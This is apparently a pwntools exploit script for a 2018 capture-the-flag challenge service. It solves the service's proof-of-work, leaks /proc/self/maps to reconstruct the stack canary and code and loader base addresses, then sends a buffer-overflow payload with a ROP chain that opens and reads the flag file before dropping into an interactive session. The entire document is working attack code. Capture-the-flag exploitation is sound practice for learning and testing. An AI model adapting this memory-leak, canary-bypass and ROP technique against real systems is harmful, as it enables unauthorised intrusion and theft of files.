#!/usr/bin/env python
import subprocess
import re
import time
from pwn import *

r = remote("cee810fa.quals2018.oooverflow.io", 31337)
# r = process("./baby.bin")

r.recvuntil("Challenge: ")
challenge = r.readline()[:-1]
print "Challenge: " + challenge
r.recvuntil("n: ")
n = int(r.readline())
print "N: " + repr(n)

print "Cmd: ./solve_pow.py {} {}".format(challenge, n)
solution = subprocess.check_output("./solve_pow.py {} {}".format(challenge, n), shell=True)
m = re.match(r'(\d+)', solution, re.DOTALL)
assert m is not None
solution = m.group(1)
print solution

r.sendlineafter("Solution: ", solution)
r.recvuntil("requests")
r.sendline("HEAD /proc/self/maps")
r.recvuntil("\n")
r.recvuntil("\n")
canary1 = int(r.recvuntil("r-xp").split("-")[0],16) >> 12
canary2 = int(r.recvuntil("r-xp").split("\n")[-1].split("-")[0],16) >> 12
data = r.recvuntil("rw-p")
if "ld" in data :
    canary = ((canary2 << 28) + (canary1)) << 8
    code = canary1 << 12
    ld = canary2 << 12
else :
    canary = ((canary1 << 28) + (canary2)) << 8
    code = canary2 << 12
    ld = canary1 << 12
print "canary:",hex(canary)
print "code:",hex(code)
pop_rbp = code + 0xb40
buf = code + 0x202500
proc = code + 0xecb
pop_rdi = ld + 0x2112
pop_rsi = ld + 0x106ca
pop_rdx_rbx = ld + 0x0000000000000d5f
read = code + 0xa60
write = code + 0x9f0
o = code + 0xaa0
read_file = code + 0xd7c
write_file = code + 0xfb2
r.sendline("HEAD flag")
context.arch = "amd64"
rop = flat([pop_rdi,0,pop_rsi,buf,pop_rdx_rbx,0x40,0,read,pop_rdi,buf,pop_rsi,0,pop_rdx_rbx,0,0,o,write_file])
payload = "a"*0x58 + p64(canary) + p64(buf) + rop
r.sendline(payload)
r.recvuntil("request")
r.sendline("flag\x00")
r.interactive()
